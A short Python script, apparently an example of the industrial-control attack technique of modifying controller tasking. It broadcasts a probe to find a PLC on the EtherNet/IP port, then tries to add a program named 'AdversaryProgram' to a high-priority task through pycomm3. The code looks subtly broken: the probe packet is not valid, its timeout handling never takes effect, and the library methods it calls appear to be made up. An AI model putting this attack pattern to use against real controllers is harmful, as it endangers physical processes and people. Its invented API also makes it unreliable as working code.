import socket
import pycomm3
from pycomm3 import LogixDriver

# Function to discover the PLC's IP address
def discover_plc_ip():
    # This is a simple example using a broadcast to find the PLC.
    # In a real-world scenario, you might use a more sophisticated method.
    broadcast_ip = '255.255.255.255'
    port = 44818  # Common port for Ethernet/IP

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b'WhoIsThere', (broadcast_ip, port))

    try:
        data, addr = sock.recvfrom(1024)
        print(f"PLC found at IP: {addr[0]}")
        return addr[0]
    except socket.timeout:
        print("No PLC found.")
        return None
    finally:
        sock.close()

# Function to connect to the PLC and modify tasking
def modify_controller_tasking(plc_ip, program_name, task_name):
    try:
        with LogixDriver(plc_ip) as plc:
            # Check if the program exists
            if program_name not in plc.get_programs():
                print(f"Program '{program_name}' does not exist.")
                return

            # Check if the task exists
            if task_name not in plc.get_tasks():
                print(f"Task '{task_name}' does not exist.")
                return

            # Modify the task to include the program
            plc.add_program_to_task(program_name, task_name)
            print(f"Program '{program_name}' added to task '{task_name}'.")

    except Exception as e:
        print(f"Error: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        return

    # Define the program and task names
    program_name = 'AdversaryProgram'
    task_name = 'HighPriorityTask'

    # Modify the controller tasking
    modify_controller_tasking(plc_ip, program_name, task_name)

if __name__ == "__main__":
    main()